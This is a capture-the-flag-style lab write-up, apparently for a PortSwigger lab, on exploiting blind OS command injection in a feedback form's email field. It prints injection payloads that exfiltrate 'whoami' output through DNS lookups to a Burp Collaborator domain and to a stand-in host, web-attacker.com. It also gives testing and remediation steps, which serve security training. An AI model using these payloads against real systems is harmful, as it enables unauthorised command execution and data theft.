# Blind OS command injection with out-of-band data exfiltration

### Goal - 

Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator



### Vulnerability / Concept

This lab demonstrates a vulnerability in the os command injection category.

This lab contains a blind OS command injection vulnerability in the feedback function.

The vulnerability exists because the application fails to properly validate, sanitize, or secure the user-controlled input that reaches a sensitive operation. The specific attack surface and exploitation technique depend on the exact vulnerability type demonstrated in this lab.

### Recon / Initial Analysis

Based on the lab's objective and the PortSwigger solution:

1. Analyze the application's functionality to identify the attack surface
2. Use Burp Suite Professional to intercept and modify the request that submits feedback.
                    
                    
                        Go to the Collaborator tab.
                   
3. Use Burp Suite Proxy to intercept and analyze requests
4. Identify the specific vulnerability type by testing user-controlled input
5. Determine the appropriate exploitation technique for this lab

### Analysis/Exploitation 

First have a look at the website and its feedback feature. I submit a feedback and send the request to repeater. In the previous lab, we found that the `email` parameter is vulnerable to blind OS command injection:
I assume that the attack vector is the same as in the other labs: the email input field.

try to do **OS command injection** in the `email` parameter:

`;id;#`

![](./images/aaa55b41f52d_001.png)

However, there’s no output of our command in the response, it might be vulnerable to blind OS command injection.

Therefore I open a new Burp Collaborator client and generate a new payload. URLencode the payload to avoid breaking the request.

```bash
;nslookup 8mvkjln6evqts94q7vwt31eziqoic90y.oastify.com;#
```

![](./images/aaa55b41f52d_002.png)

we successfully received 2 DNS lookups, which means the feedback function is indeed vulnerable to blind OS command injection!!

Once we’ve confirmed blind OS command injection, we can exfiltrate the output from injected commands using OAST techniques:

{% hint style="info" %}
💡 The out-of-band channel provides an easy way to exfiltrate the output from injected commands:

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command:

```bash
wwwuser.kgji2ohoyw.web-attacker.com
```

{% endhint %}


Add the output of `whoami` as subdomain to the domain name provided but Burp Collaborator and send the request. URLencode the payload to avoid breaking the request.

```bash
; nslookup `whoami`.8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
or
; nslookup $(whoami).8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
```

![](./images/aaa55b41f52d_003.png)

The username is shown in the DNS request:

![](./images/aaa55b41f52d_004.png)

### Why It Works

The vulnerability exists because the application processes user-controlled input without adequate security validation. In this specific lab, the attack succeeds because:

- The application trusts the user input without proper server-side validation
- The input reaches a sensitive operation (database query, HTML rendering, system command, etc.) without sanitization
- The security boundary that should protect the operation is missing or incorrectly implemented
- The specific payload used exploits the exact weakness in the application's input handling

The PortSwigger lab description confirms this: "This lab contains a blind OS command injection vulnerability in the feedback function."

### Attack Flow

**Attack Flow:**

```
Attacker Input (payload in request)
        ↓
Application Functionality (processes user input)
        ↓
Server Processing (no validation/sanitization)
        ↓
Injection Point (input reaches sensitive operation)
        ↓
Exploitation (payload executes as intended)
        ↓
Lab Objective Achieved
```

### Real-World Impact

An attacker could execute arbitrary OS commands, read sensitive files, modify or delete data, establish persistence, pivot to other internal systems, or achieve full server compromise.

### Detection / Testing Methodology

1. Identify parameters that are used in system commands (file paths, hostnames, usernames)
2. Test with command separators (;, |, &&, ||)
3. Test for blind injection (time delays via sleep/ping)
4. Test for out-of-band data exfiltration (DNS callbacks)
5. Check if command output is reflected in the response
6. Test with different shell metacharacters

### Remediation

- Use parameterized APIs instead of shell commands (e.g., exec() with argument arrays)
- Never concatenate user input into command strings
- Use strict input validation (allowlists for expected characters)
- Run the application with least privilege
- Disable dangerous shell functions (system(), exec(), passthru())
- Use a sandbox or containerized environment

### Key Takeaways

- This lab demonstrates a os command injection vulnerability in a real-world scenario.
- The vulnerability occurs because user input reaches a sensitive operation without proper validation.
- The PortSwigger lab confirms: "This lab contains a blind OS command injection vulnerability in the feedback function."
- Burp Suite is essential for identifying and exploiting this vulnerability.
- The remediation for this specific vulnerability involves: - Use parameterized APIs instead of shell commands (e.g., exec() with argument arrays)
